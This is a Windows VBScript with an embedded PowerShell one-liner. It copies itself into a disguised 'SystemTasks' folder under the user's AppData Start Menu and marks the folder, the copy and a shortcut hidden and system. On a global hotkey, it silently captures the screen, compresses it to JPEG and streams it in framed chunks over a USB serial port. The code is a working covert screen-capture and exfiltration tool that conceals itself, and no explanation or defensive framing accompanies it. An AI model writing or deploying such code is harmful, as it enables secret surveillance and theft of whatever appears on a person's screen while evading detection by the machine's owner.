Option Explicit

' =============================
' CONFIGURATION
' =============================
Dim hotkey
hotkey = "CTRL+ALT+SHIFT+V"   ' Global hotkey combination (supports CTRL, ALT, SHIFT)

' =============================
' CONSTANTS
' =============================
Const HIDDEN = 2
Const SYSTEM = 4

' =============================
' OBJECTS
' =============================
Dim fso, wsh
Set fso = CreateObject("Scripting.FileSystemObject")
Set wsh = CreateObject("WScript.Shell")

' =============================
' SELF INFORMATION
' =============================
Dim sourceVBScript, fileName, hiddenFolder, targetVBScript, shortcutName, shortcutPath
sourceVBScript = WScript.ScriptFullName
fileName = fso.GetFileName(sourceVBScript)
hiddenFolder = wsh.ExpandEnvironmentStrings("%AppData%") & "\Microsoft\Windows\Start Menu\Programs\SystemTasks"
targetVBScript = hiddenFolder & "\" & fileName
shortcutName = fso.GetBaseName(fileName) & ".lnk"
shortcutPath = hiddenFolder & "\" & shortcutName

' =============================
' ENSURE HIDDEN SYSTEM FOLDER EXISTS
' =============================
If Not fso.FolderExists(hiddenFolder) Then
    fso.CreateFolder hiddenFolder
    ' Apply hidden + system attributes
    On Error Resume Next
    SetAttr hiddenFolder, HIDDEN Or SYSTEM
    On Error GoTo 0
End If

' =============================
' COPY SELF TO HIDDEN FOLDER IF NEEDED
' =============================
Dim copyNeeded
copyNeeded = False

If Not fso.FileExists(targetVBScript) Then
    copyNeeded = True
Else
    Dim srcFile, dstFile
    Set srcFile = fso.GetFile(sourceVBScript)
    Set dstFile = fso.GetFile(targetVBScript)
    If srcFile.DateLastModified > dstFile.DateLastModified Then
        copyNeeded = True
    End If
End If

If copyNeeded Then
    fso.CopyFile sourceVBScript, targetVBScript, True
    ' Apply hidden + system attributes to copied file
    On Error Resume Next
    SetAttr targetVBScript, HIDDEN Or SYSTEM
    On Error GoTo 0
End If

' =============================
' CREATE OR UPDATE SHORTCUT
' =============================
Dim shortcut, updateNeeded
updateNeeded = False

If fso.FileExists(shortcutPath) Then
    Set shortcut = wsh.CreateShortcut(shortcutPath)
    If shortcut.TargetPath <> "wscript.exe" _
       Or shortcut.Arguments <> Chr(34) & targetVBScript & Chr(34) _
       Or shortcut.Hotkey <> hotkey Then
        updateNeeded = True
    End If
Else
    updateNeeded = True
    Set shortcut = wsh.CreateShortcut(shortcutPath)
End If

If updateNeeded Then
    shortcut.TargetPath = "wscript.exe"
    shortcut.Arguments = Chr(34) & targetVBScript & Chr(34)
    shortcut.WorkingDirectory = hiddenFolder
    shortcut.IconLocation = "wscript.exe, 0"
    shortcut.WindowStyle = 7   ' Hidden
    shortcut.Hotkey = hotkey
    shortcut.Save
    ' Apply hidden + system attributes to shortcut
    On Error Resume Next
    SetAttr shortcutPath, HIDDEN Or SYSTEM
    On Error GoTo 0
End If

' =============================
' MAIN CODE SECTION
' =============================
CreateObject("WScript.Shell").Run "powershell.exe -WindowStyle Hidden -Command ""$p=(Get-PnpDevice -Class Ports|?{$_.Status -eq 'OK' -and $_.FriendlyName -like '*USB*'}|%{if($_.FriendlyName -match '(COM\d+)'){$matches[1]}}|select -First 1);if($p){Add-Type -AssemblyName System.Windows.Forms;[System.Windows.Forms.SendKeys]::SendWait('^{PRTSC}');Start-Sleep -Milliseconds 10;if($i=Get-Clipboard -Format Image -ea 0){$w=[int]($i.Width/2);$h=[int]($i.Height/2);$r=New-Object System.Drawing.Bitmap($w,$h);$g=[System.Drawing.Graphics]::FromImage($r);$g.InterpolationMode=7;$g.DrawImage($i,0,0,$w,$h);$g.Dispose();$m=New-Object IO.MemoryStream;$ep=New-Object System.Drawing.Imaging.EncoderParameters(1);$ep.Param[0]=New-Object System.Drawing.Imaging.EncoderParameter([System.Drawing.Imaging.Encoder]::Quality,70L);$jc=[System.Drawing.Imaging.ImageCodecInfo]::GetImageEncoders()|?{$_.FormatID -eq [System.Drawing.Imaging.ImageFormat]::Jpeg.Guid}|select -First 1;$r.Save($m,$jc,$ep);$r.Dispose();$bytes=$m.ToArray();$m.Dispose();$i.Dispose();function wSF{param($pt,[byte]$ft,[byte[]]$d);$o=[Collections.Generic.List[byte]]::new();$o.Add(0xC0);$o.Add($ft);foreach($b in $d){if($b -eq 0xC0){$o.Add(0xDB);$o.Add(0xDC)}elseif($b -eq 0xDB){$o.Add(0xDB);$o.Add(0xDD)}else{$o.Add($b)}};$o.Add(0xC0);$a=$o.ToArray();$pt.Write($a,0,$a.Count)};$s=New-Object IO.Ports.SerialPort $p,921600;try{$s.Open();wSF $s 0x01 @();Start-Sleep -Milliseconds 50;for($x=0;$x -lt $bytes.Length;$x+=128){$c=[Math]::Min(128,$bytes.Length-$x);$chunk=New-Object byte[] $c;[Array]::Copy($bytes,$x,$chunk,0,$c);wSF $s 0x02 $chunk;Start-Sleep -Milliseconds 10};wSF $s 0x03 @();Start-Sleep -Milliseconds 20}finally{if($s.IsOpen){$s.Close()}}}}""", 0, False

' =============================
' CLEANUP
' =============================
Set shortcut = Nothing
Set fso = Nothing
Set wsh = Nothing
